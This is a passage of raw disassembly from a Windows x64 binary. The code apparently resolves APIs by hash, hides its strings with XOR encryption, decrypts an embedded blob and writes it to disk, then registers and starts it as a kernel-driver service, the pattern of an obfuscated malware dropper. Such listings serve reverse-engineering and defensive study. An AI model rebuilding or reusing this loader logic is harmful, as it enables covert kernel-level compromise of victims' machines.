   1400056fd:	0f 85 87 00 00 00    	jne    0x14000578a
   140005703:	ff 15 07 59 00 00    	call   *0x5907(%rip)        # 0x14000b010
   140005709:	8b f8                	mov    %eax,%edi
   14000570b:	48 8b 15 86 17 02 00 	mov    0x21786(%rip),%rdx        # 0x140026e98
   140005712:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005717:	e8 f4 0b 00 00       	call   0x140006310
   14000571c:	4c 8d 0d ad 91 00 00 	lea    0x91ad(%rip),%r9        # 0x14000e8d0
   140005723:	48 ff c3             	inc    %rbx
   140005726:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   14000572b:	75 f6                	jne    0x140005723
   14000572d:	48 83 3d 63 17 02 00 	cmpq   $0x0,0x21763(%rip)        # 0x140026e98
   140005734:	00 
   140005735:	0f 86 28 09 00 00    	jbe    0x140006063
   14000573b:	4c 8d 15 46 17 02 00 	lea    0x21746(%rip),%r10        # 0x140026e88
   140005742:	4d 8b c2             	mov    %r10,%r8
   140005745:	48 83 3d 53 17 02 00 	cmpq   $0xf,0x21753(%rip)        # 0x140026ea0
   14000574c:	0f 
   14000574d:	4c 0f 47 05 33 17 02 	cmova  0x21733(%rip),%r8        # 0x140026e88
   140005754:	00 
   140005755:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000575a:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   14000575f:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005765:	33 d2                	xor    %edx,%edx
   140005767:	48 8b c6             	mov    %rsi,%rax
   14000576a:	48 f7 f3             	div    %rbx
   14000576d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005772:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   140005776:	88 04 31             	mov    %al,(%rcx,%rsi,1)
   140005779:	48 ff c6             	inc    %rsi
   14000577c:	48 3b 35 15 17 02 00 	cmp    0x21715(%rip),%rsi        # 0x140026e98
   140005783:	72 bd                	jb     0x140005742
   140005785:	e9 d9 08 00 00       	jmp    0x140006063
   14000578a:	ba 4d ac 81 c1       	mov    $0xc181ac4d,%edx
   14000578f:	49 8b cc             	mov    %r12,%rcx
   140005792:	e8 99 ed ff ff       	call   0x140004530
   140005797:	4c 8b f0             	mov    %rax,%r14
   14000579a:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   14000579e:	ba a7 c5 f2 fe       	mov    $0xfef2c5a7,%edx
   1400057a3:	49 8b cc             	mov    %r12,%rcx
   1400057a6:	e8 85 ed ff ff       	call   0x140004530
   1400057ab:	4c 8b f8             	mov    %rax,%r15
   1400057ae:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   1400057b2:	ba 79 bc 1f c3       	mov    $0xc31fbc79,%edx
   1400057b7:	49 8b cc             	mov    %r12,%rcx
   1400057ba:	e8 71 ed ff ff       	call   0x140004530
   1400057bf:	48 8b f8             	mov    %rax,%rdi
   1400057c2:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   1400057c6:	ba 60 fe 47 2e       	mov    $0x2e47fe60,%edx
   1400057cb:	49 8b cc             	mov    %r12,%rcx
   1400057ce:	e8 5d ed ff ff       	call   0x140004530
   1400057d3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400057d7:	4d 85 f6             	test   %r14,%r14
   1400057da:	0f 84 27 07 00 00    	je     0x140005f07
   1400057e0:	4d 85 ff             	test   %r15,%r15
   1400057e3:	0f 84 1e 07 00 00    	je     0x140005f07
   1400057e9:	48 85 ff             	test   %rdi,%rdi
   1400057ec:	0f 84 15 07 00 00    	je     0x140005f07
   1400057f2:	48 85 c0             	test   %rax,%rax
   1400057f5:	0f 84 0c 07 00 00    	je     0x140005f07
   1400057fb:	48 8b 15 76 16 02 00 	mov    0x21676(%rip),%rdx        # 0x140026e78
   140005802:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005806:	e8 05 0b 00 00       	call   0x140006310
   14000580b:	4c 8b d3             	mov    %rbx,%r10
   14000580e:	4c 8d 1d bb 90 00 00 	lea    0x90bb(%rip),%r11        # 0x14000e8d0
   140005815:	49 ff c2             	inc    %r10
   140005818:	43 80 3c 13 00       	cmpb   $0x0,(%r11,%r10,1)
   14000581d:	75 f6                	jne    0x140005815
   14000581f:	4c 8b ce             	mov    %rsi,%r9
   140005822:	48 39 35 4f 16 02 00 	cmp    %rsi,0x2164f(%rip)        # 0x140026e78
   140005829:	76 49                	jbe    0x140005874
   14000582b:	48 8d 3d 36 16 02 00 	lea    0x21636(%rip),%rdi        # 0x140026e68
   140005832:	4c 8b c7             	mov    %rdi,%r8
   140005835:	48 83 3d 43 16 02 00 	cmpq   $0xf,0x21643(%rip)        # 0x140026e80
   14000583c:	0f 
   14000583d:	4c 0f 47 05 23 16 02 	cmova  0x21623(%rip),%r8        # 0x140026e68
   140005844:	00 
   140005845:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005849:	48 83 7d 30 0f       	cmpq   $0xf,0x30(%rbp)
   14000584e:	48 0f 47 4d 18       	cmova  0x18(%rbp),%rcx
   140005853:	33 d2                	xor    %edx,%edx
   140005855:	49 8b c1             	mov    %r9,%rax
   140005858:	49 f7 f2             	div    %r10
   14000585b:	42 0f b6 04 1a       	movzbl (%rdx,%r11,1),%eax
   140005860:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005864:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005868:	49 ff c1             	inc    %r9
   14000586b:	4c 3b 0d 06 16 02 00 	cmp    0x21606(%rip),%r9        # 0x140026e78
   140005872:	72 be                	jb     0x140005832
   140005874:	48 8b 15 3d 16 02 00 	mov    0x2163d(%rip),%rdx        # 0x140026eb8
   14000587b:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   14000587f:	e8 8c 0a 00 00       	call   0x140006310
   140005884:	4c 8d 35 3d 90 00 00 	lea    0x903d(%rip),%r14        # 0x14000e8c8
   14000588b:	4c 8b db             	mov    %rbx,%r11
   14000588e:	66 90                	xchg   %ax,%ax
   140005890:	49 ff c3             	inc    %r11
   140005893:	43 80 3c 1e 00       	cmpb   $0x0,(%r14,%r11,1)
   140005898:	75 f6                	jne    0x140005890
   14000589a:	4c 8b d6             	mov    %rsi,%r10
   14000589d:	48 39 35 14 16 02 00 	cmp    %rsi,0x21614(%rip)        # 0x140026eb8
   1400058a4:	76 4c                	jbe    0x1400058f2
   1400058a6:	48 8d 3d fb 15 02 00 	lea    0x215fb(%rip),%rdi        # 0x140026ea8
   1400058ad:	0f 1f 00             	nopl   (%rax)
   1400058b0:	4c 8b cf             	mov    %rdi,%r9
   1400058b3:	48 83 3d 05 16 02 00 	cmpq   $0xf,0x21605(%rip)        # 0x140026ec0
   1400058ba:	0f 
   1400058bb:	4c 0f 47 0d e5 15 02 	cmova  0x215e5(%rip),%r9        # 0x140026ea8
   1400058c2:	00 
   1400058c3:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   1400058c7:	48 83 7d 10 0f       	cmpq   $0xf,0x10(%rbp)
   1400058cc:	4c 0f 47 45 f8       	cmova  -0x8(%rbp),%r8
   1400058d1:	33 d2                	xor    %edx,%edx
   1400058d3:	49 8b c2             	mov    %r10,%rax
   1400058d6:	49 f7 f3             	div    %r11
   1400058d9:	42 0f b6 04 32       	movzbl (%rdx,%r14,1),%eax
   1400058de:	43 32 04 11          	xor    (%r9,%r10,1),%al
   1400058e2:	43 88 04 10          	mov    %al,(%r8,%r10,1)
   1400058e6:	49 ff c2             	inc    %r10
   1400058e9:	4c 3b 15 c8 15 02 00 	cmp    0x215c8(%rip),%r10        # 0x140026eb8
   1400058f0:	72 be                	jb     0x1400058b0
   1400058f2:	48 8d 0d 5f 90 00 00 	lea    0x905f(%rip),%rcx        # 0x14000e958
   1400058f9:	ff 15 09 57 00 00    	call   *0x5709(%rip)        # 0x14000b008
   1400058ff:	4c 8b e8             	mov    %rax,%r13
   140005902:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140005908:	48 85 c0             	test   %rax,%rax
   14000590b:	0f 84 94 04 00 00    	je     0x140005da5
   140005911:	ba ce c9 ca bd       	mov    $0xbdcac9ce,%edx
   140005916:	48 8b c8             	mov    %rax,%rcx
   140005919:	e8 12 ec ff ff       	call   0x140004530
   14000591e:	48 8b f8             	mov    %rax,%rdi
   140005921:	ba 4a c4 07 7f       	mov    $0x7f07c44a,%edx
   140005926:	49 8b cd             	mov    %r13,%rcx
   140005929:	e8 02 ec ff ff       	call   0x140004530
   14000592e:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140005932:	ba 65 00 ba fa       	mov    $0xfaba0065,%edx
   140005937:	49 8b cd             	mov    %r13,%rcx
   14000593a:	e8 f1 eb ff ff       	call   0x140004530
   14000593f:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140005943:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140005947:	48 83 7d 10 0f       	cmpq   $0xf,0x10(%rbp)
   14000594c:	48 0f 47 4d f8       	cmova  -0x8(%rbp),%rcx
   140005951:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140005956:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000595d:	00 
   14000595e:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140005965:	00 
   140005966:	45 33 c9             	xor    %r9d,%r9d
   140005969:	45 33 c0             	xor    %r8d,%r8d
   14000596c:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140005971:	ff d7                	call   *%rdi
   140005973:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005977:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000597b:	0f 84 24 04 00 00    	je     0x140005da5
   140005981:	4c 8b cb             	mov    %rbx,%r9
   140005984:	48 8d 05 45 8f 00 00 	lea    0x8f45(%rip),%rax        # 0x14000e8d0
   14000598b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005990:	49 ff c1             	inc    %r9
   140005993:	42 80 3c 08 00       	cmpb   $0x0,(%rax,%r9,1)
   140005998:	75 f6                	jne    0x140005990
   14000599a:	4c 8d 35 1f c7 00 00 	lea    0xc71f(%rip),%r14        # 0x1400120c0
   1400059a1:	4d 8b d7             	mov    %r15,%r10
   1400059a4:	4d 2b d6             	sub    %r14,%r10
   1400059a7:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   1400059ad:	4d 2b de             	sub    %r14,%r11
   1400059b0:	bf 03 00 00 00       	mov    $0x3,%edi
   1400059b5:	49 2b fe             	sub    %r14,%rdi
   1400059b8:	41 bd 04 00 00 00    	mov    $0x4,%r13d
   1400059be:	4d 2b ee             	sub    %r14,%r13
   1400059c1:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   1400059c7:	4d 2b c6             	sub    %r14,%r8
   1400059ca:	4c 8b e6             	mov    %rsi,%r12
   1400059cd:	4c 8d 3d fc 8e 00 00 	lea    0x8efc(%rip),%r15        # 0x14000e8d0
   1400059d4:	4b 8d 0c 34          	lea    (%r12,%r14,1),%rcx
   1400059d8:	33 d2                	xor    %edx,%edx
   1400059da:	49 8b c4             	mov    %r12,%rax
   1400059dd:	49 f7 f1             	div    %r9
   1400059e0:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   1400059e5:	30 01                	xor    %al,(%rcx)
   1400059e7:	4a 8d 04 11          	lea    (%rcx,%r10,1),%rax
   1400059eb:	33 d2                	xor    %edx,%edx
   1400059ed:	49 f7 f1             	div    %r9
   1400059f0:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   1400059f5:	30 41 01             	xor    %al,0x1(%rcx)
   1400059f8:	4a 8d 04 19          	lea    (%rcx,%r11,1),%rax
   1400059fc:	33 d2                	xor    %edx,%edx
   1400059fe:	49 f7 f1             	div    %r9
   140005a01:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005a06:	30 41 02             	xor    %al,0x2(%rcx)
   140005a09:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   140005a0d:	33 d2                	xor    %edx,%edx
   140005a0f:	49 f7 f1             	div    %r9
   140005a12:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005a17:	30 41 03             	xor    %al,0x3(%rcx)
   140005a1a:	4a 8d 04 29          	lea    (%rcx,%r13,1),%rax
   140005a1e:	33 d2                	xor    %edx,%edx
   140005a20:	49 f7 f1             	div    %r9
   140005a23:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005a28:	30 41 04             	xor    %al,0x4(%rcx)
   140005a2b:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   140005a2f:	33 d2                	xor    %edx,%edx
   140005a31:	49 f7 f1             	div    %r9
   140005a34:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005a39:	30 41 05             	xor    %al,0x5(%rcx)
   140005a3c:	49 83 c4 06          	add    $0x6,%r12
   140005a40:	49 81 fc a0 43 01 00 	cmp    $0x143a0,%r12
   140005a47:	72 8b                	jb     0x1400059d4
   140005a49:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005a4e:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   140005a52:	41 b8 a0 43 01 00    	mov    $0x143a0,%r8d
   140005a58:	49 8b d6             	mov    %r14,%rdx
   140005a5b:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140005a5f:	ff 55 98             	call   *-0x68(%rbp)
   140005a62:	8b f8                	mov    %eax,%edi
   140005a64:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140005a68:	ff 55 a0             	call   *-0x60(%rbp)
   140005a6b:	85 ff                	test   %edi,%edi
   140005a6d:	4c 8d 35 54 8e 00 00 	lea    0x8e54(%rip),%r14        # 0x14000e8c8
   140005a74:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140005a7a:	4c 8b 65 a8          	mov    -0x58(%rbp),%r12
   140005a7e:	0f 84 21 03 00 00    	je     0x140005da5
   140005a84:	33 d2                	xor    %edx,%edx
   140005a86:	33 c9                	xor    %ecx,%ecx
   140005a88:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140005a8e:	ff 55 b0             	call   *-0x50(%rbp)
   140005a91:	4c 8b e8             	mov    %rax,%r13
   140005a94:	48 85 c0             	test   %rax,%rax
   140005a97:	0f 85 8d 00 00 00    	jne    0x140005b2a
   140005a9d:	ff 15 6d 55 00 00    	call   *0x556d(%rip)        # 0x14000b010
   140005aa3:	8b f8                	mov    %eax,%edi
   140005aa5:	48 8b 15 8c 14 02 00 	mov    0x2148c(%rip),%rdx        # 0x140026f38
   140005aac:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005ab1:	e8 5a 08 00 00       	call   0x140006310
   140005ab6:	4c 8d 15 13 8e 00 00 	lea    0x8e13(%rip),%r10        # 0x14000e8d0
   140005abd:	0f 1f 00             	nopl   (%rax)
   140005ac0:	48 ff c3             	inc    %rbx
   140005ac3:	41 80 3c 1a 00       	cmpb   $0x0,(%r10,%rbx,1)
   140005ac8:	75 f6                	jne    0x140005ac0
   140005aca:	4c 8b ce             	mov    %rsi,%r9
   140005acd:	48 39 35 64 14 02 00 	cmp    %rsi,0x21464(%rip)        # 0x140026f38
   140005ad4:	0f 86 4c 03 00 00    	jbe    0x140005e26
   140005ada:	4c 8d 1d 47 14 02 00 	lea    0x21447(%rip),%r11        # 0x140026f28
   140005ae1:	4d 8b c3             	mov    %r11,%r8
   140005ae4:	48 83 3d 54 14 02 00 	cmpq   $0xf,0x21454(%rip)        # 0x140026f40
   140005aeb:	0f 
   140005aec:	4c 0f 47 05 34 14 02 	cmova  0x21434(%rip),%r8        # 0x140026f28
   140005af3:	00 
   140005af4:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005af9:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005afe:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005b04:	33 d2                	xor    %edx,%edx
   140005b06:	49 8b c1             	mov    %r9,%rax
   140005b09:	48 f7 f3             	div    %rbx
   140005b0c:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140005b11:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005b15:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005b19:	49 ff c1             	inc    %r9
   140005b1c:	4c 3b 0d 15 14 02 00 	cmp    0x21415(%rip),%r9        # 0x140026f38
   140005b23:	72 bc                	jb     0x140005ae1
   140005b25:	e9 fc 02 00 00       	jmp    0x140005e26
   140005b2a:	4c 8d 45 18          	lea    0x18(%rbp),%r8
   140005b2e:	48 83 7d 30 0f       	cmpq   $0xf,0x30(%rbp)
   140005b33:	4c 0f 47 45 18       	cmova  0x18(%rbp),%r8
   140005b38:	48 8d 55 18          	lea    0x18(%rbp),%rdx
   140005b3c:	48 0f 47 55 18       	cmova  0x18(%rbp),%rdx
   140005b41:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   140005b45:	48 83 7d 10 0f       	cmpq   $0xf,0x10(%rbp)
   140005b4a:	48 0f 47 45 f8       	cmova  -0x8(%rbp),%rax
   140005b4f:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   140005b54:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140005b59:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140005b5e:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140005b63:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140005b68:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005b6d:	44 89 7c 24 30       	mov    %r15d,0x30(%rsp)
   140005b72:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140005b79:	00 
   140005b7a:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140005b7f:	41 b9 ff 01 0f 00    	mov    $0xf01ff,%r9d
   140005b85:	49 8b cd             	mov    %r13,%rcx
   140005b88:	ff 55 b8             	call   *-0x48(%rbp)
   140005b8b:	48 8b f8             	mov    %rax,%rdi
   140005b8e:	48 85 c0             	test   %rax,%rax
   140005b91:	0f 85 ac 00 00 00    	jne    0x140005c43
   140005b97:	ff 15 73 54 00 00    	call   *0x5473(%rip)        # 0x14000b010
   140005b9d:	8b f8                	mov    %eax,%edi
   140005b9f:	48 8b 15 92 12 02 00 	mov    0x21292(%rip),%rdx        # 0x140026e38
   140005ba6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005bab:	e8 60 07 00 00       	call   0x140006310
   140005bb0:	48 ff c3             	inc    %rbx
   140005bb3:	41 80 3c 1e 00       	cmpb   $0x0,(%r14,%rbx,1)
   140005bb8:	75 f6                	jne    0x140005bb0
   140005bba:	4c 8b ce             	mov    %rsi,%r9
   140005bbd:	48 39 35 74 12 02 00 	cmp    %rsi,0x21274(%rip)        # 0x140026e38
   140005bc4:	76 4e                	jbe    0x140005c14
   140005bc6:	4c 8d 15 5b 12 02 00 	lea    0x2125b(%rip),%r10        # 0x140026e28
   140005bcd:	0f 1f 00             	nopl   (%rax)
   140005bd0:	4d 8b c2             	mov    %r10,%r8
   140005bd3:	48 83 3d 65 12 02 00 	cmpq   $0xf,0x21265(%rip)        # 0x140026e40
   140005bda:	0f 
   140005bdb:	4c 0f 47 05 45 12 02 	cmova  0x21245(%rip),%r8        # 0x140026e28
   140005be2:	00 
   140005be3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005be8:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005bed:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005bf3:	33 d2                	xor    %edx,%edx
   140005bf5:	49 8b c1             	mov    %r9,%rax
   140005bf8:	48 f7 f3             	div    %rbx
   140005bfb:	42 0f b6 04 32       	movzbl (%rdx,%r14,1),%eax
   140005c00:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005c04:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005c08:	49 ff c1             	inc    %r9
   140005c0b:	4c 3b 0d 26 12 02 00 	cmp    0x21226(%rip),%r9        # 0x140026e38
   140005c12:	72 bc                	jb     0x140005bd0
   140005c14:	48 8d 15 45 08 02 00 	lea    0x20845(%rip),%rdx        # 0x140026460
   140005c1b:	48 83 3d 55 08 02 00 	cmpq   $0xf,0x20855(%rip)        # 0x140026478
   140005c22:	0f 
   140005c23:	48 0f 47 15 35 08 02 	cmova  0x20835(%rip),%rdx        # 0x140026460
   140005c2a:	00 
   140005c2b:	44 8b cf             	mov    %edi,%r9d
   140005c2e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005c33:	e8 c8 e9 ff ff       	call   0x140004600
   140005c38:	49 8b cd             	mov    %r13,%rcx
   140005c3b:	ff 55 e0             	call   *-0x20(%rbp)
   140005c3e:	e9 07 02 00 00       	jmp    0x140005e4a
   140005c43:	45 33 c0             	xor    %r8d,%r8d
   140005c46:	33 d2                	xor    %edx,%edx
   140005c48:	48 8b cf             	mov    %rdi,%rcx
   140005c4b:	ff 55 90             	call   *-0x70(%rbp)
   140005c4e:	85 c0                	test   %eax,%eax
   140005c50:	0f 85 aa 00 00 00    	jne    0x140005d00
   140005c56:	ff 15 b4 53 00 00    	call   *0x53b4(%rip)        # 0x14000b010
   140005c5c:	8b f8                	mov    %eax,%edi
   140005c5e:	48 8b 15 93 12 02 00 	mov    0x21293(%rip),%rdx        # 0x140026ef8
   140005c65:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005c6a:	e8 a1 06 00 00       	call   0x140006310
   140005c6f:	4c 8d 0d 4a 8c 00 00 	lea    0x8c4a(%rip),%r9        # 0x14000e8c0
   140005c76:	48 ff c3             	inc    %rbx
   140005c79:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140005c7e:	75 f6                	jne    0x140005c76
   140005c80:	4c 8b d6             	mov    %rsi,%r10
   140005c83:	48 39 35 6e 12 02 00 	cmp    %rsi,0x2126e(%rip)        # 0x140026ef8
   140005c8a:	76 4b                	jbe    0x140005cd7
   140005c8c:	4c 8d 1d 55 12 02 00 	lea    0x21255(%rip),%r11        # 0x140026ee8
   140005c93:	4d 8b c3             	mov    %r11,%r8
   140005c96:	48 83 3d 62 12 02 00 	cmpq   $0xf,0x21262(%rip)        # 0x140026f00
   140005c9d:	0f 
   140005c9e:	4c 0f 47 05 42 12 02 	cmova  0x21242(%rip),%r8        # 0x140026ee8
   140005ca5:	00 
   140005ca6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005cab:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005cb0:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005cb6:	33 d2                	xor    %edx,%edx
   140005cb8:	49 8b c2             	mov    %r10,%rax
   140005cbb:	48 f7 f3             	div    %rbx
   140005cbe:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005cc3:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005cc7:	42 88 04 11          	mov    %al,(%rcx,%r10,1)
   140005ccb:	49 ff c2             	inc    %r10
   140005cce:	4c 3b 15 23 12 02 00 	cmp    0x21223(%rip),%r10        # 0x140026ef8
   140005cd5:	72 bc                	jb     0x140005c93
   140005cd7:	48 8d 15 82 07 02 00 	lea    0x20782(%rip),%rdx        # 0x140026460
   140005cde:	48 83 3d 92 07 02 00 	cmpq   $0xf,0x20792(%rip)        # 0x140026478
   140005ce5:	0f 
   140005ce6:	48 0f 47 15 72 07 02 	cmova  0x20772(%rip),%rdx        # 0x140026460
   140005ced:	00 
   140005cee:	44 8b cf             	mov    %edi,%r9d
   140005cf1:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005cf6:	e8 05 e9 ff ff       	call   0x140004600
   140005cfb:	e9 54 01 00 00       	jmp    0x140005e54
   140005d00:	48 8b 15 11 12 02 00 	mov    0x21211(%rip),%rdx        # 0x140026f18
   140005d07:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005d0c:	e8 ff 05 00 00       	call   0x140006310
   140005d11:	4c 8d 0d a8 8b 00 00 	lea    0x8ba8(%rip),%r9        # 0x14000e8c0
   140005d18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140005d1f:	00 
   140005d20:	48 ff c3             	inc    %rbx
   140005d23:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140005d28:	75 f6                	jne    0x140005d20
   140005d2a:	4c 8b d6             	mov    %rsi,%r10
   140005d2d:	48 39 35 e4 11 02 00 	cmp    %rsi,0x211e4(%rip)        # 0x140026f18
   140005d34:	76 4e                	jbe    0x140005d84
   140005d36:	4c 8d 1d cb 11 02 00 	lea    0x211cb(%rip),%r11        # 0x140026f08
   140005d3d:	0f 1f 00             	nopl   (%rax)
   140005d40:	4d 8b c3             	mov    %r11,%r8
   140005d43:	48 83 3d d5 11 02 00 	cmpq   $0xf,0x211d5(%rip)        # 0x140026f20
   140005d4a:	0f 
   140005d4b:	4c 0f 47 05 b5 11 02 	cmova  0x211b5(%rip),%r8        # 0x140026f08
   140005d52:	00 
   140005d53:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005d58:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005d5d:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005d63:	33 d2                	xor    %edx,%edx
   140005d65:	49 8b c2             	mov    %r10,%rax
   140005d68:	48 f7 f3             	div    %rbx
   140005d6b:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005d70:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005d74:	41 88 04 0a          	mov    %al,(%r10,%rcx,1)
   140005d78:	49 ff c2             	inc    %r10
   140005d7b:	4c 3b 15 96 11 02 00 	cmp    0x21196(%rip),%r10        # 0x140026f18
   140005d82:	72 bc                	jb     0x140005d40
   140005d84:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005d89:	e8 92 f2 ff ff       	call   0x140005020
   140005d8e:	48 8b cf             	mov    %rdi,%rcx
   140005d91:	ff 55 e0             	call   *-0x20(%rbp)
   140005d94:	49 8b cc             	mov    %r12,%rcx
   140005d97:	ff 15 83 52 00 00    	call   *0x5283(%rip)        # 0x14000b020
   140005d9d:	44 8b fe             	mov    %esi,%r15d
   140005da0:	e9 af 00 00 00       	jmp    0x140005e54
   140005da5:	ff 15 65 52 00 00    	call   *0x5265(%rip)        # 0x14000b010
   140005dab:	8b f8                	mov    %eax,%edi
   140005dad:	48 8b 15 24 11 02 00 	mov    0x21124(%rip),%rdx        # 0x140026ed8
   140005db4:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005db9:	e8 52 05 00 00       	call   0x140006310
   140005dbe:	4c 8d 0d fb 8a 00 00 	lea    0x8afb(%rip),%r9        # 0x14000e8c0
   140005dc5:	48 ff c3             	inc    %rbx
   140005dc8:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140005dcd:	75 f6                	jne    0x140005dc5
   140005dcf:	4c 8b d6             	mov    %rsi,%r10
   140005dd2:	48 39 35 ff 10 02 00 	cmp    %rsi,0x210ff(%rip)        # 0x140026ed8
   140005dd9:	76 4b                	jbe    0x140005e26
   140005ddb:	4c 8d 1d e6 10 02 00 	lea    0x210e6(%rip),%r11        # 0x140026ec8
   140005de2:	4d 8b c3             	mov    %r11,%r8
   140005de5:	48 83 3d f3 10 02 00 	cmpq   $0xf,0x210f3(%rip)        # 0x140026ee0
   140005dec:	0f 
   140005ded:	4c 0f 47 05 d3 10 02 	cmova  0x210d3(%rip),%r8        # 0x140026ec8
   140005df4:	00 
   140005df5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005dfa:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005dff:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005e05:	33 d2                	xor    %edx,%edx
   140005e07:	49 8b c2             	mov    %r10,%rax
   140005e0a:	48 f7 f3             	div    %rbx
   140005e0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005e12:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005e16:	42 88 04 11          	mov    %al,(%rcx,%r10,1)
   140005e1a:	49 ff c2             	inc    %r10
   140005e1d:	4c 3b 15 b4 10 02 00 	cmp    0x210b4(%rip),%r10        # 0x140026ed8
   140005e24:	72 bc                	jb     0x140005de2
   140005e26:	48 8d 15 33 06 02 00 	lea    0x20633(%rip),%rdx        # 0x140026460
   140005e2d:	48 83 3d 43 06 02 00 	cmpq   $0xf,0x20643(%rip)        # 0x140026478
   140005e34:	0f 
   140005e35:	44 8b cf             	mov    %edi,%r9d
   140005e38:	48 0f 47 15 20 06 02 	cmova  0x20620(%rip),%rdx        # 0x140026460
   140005e3f:	00 
   140005e40:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005e45:	e8 b6 e7 ff ff       	call   0x140004600
   140005e4a:	49 8b cc             	mov    %r12,%rcx
   140005e4d:	ff 15 cd 51 00 00    	call   *0x51cd(%rip)        # 0x14000b020
   140005e53:	90                   	nop
   140005e54:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140005e58:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005e5c:	76 43                	jbe    0x140005ea1
   140005e5e:	48 ff c2             	inc    %rdx
   140005e61:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140005e65:	48 8b c1             	mov    %rcx,%rax
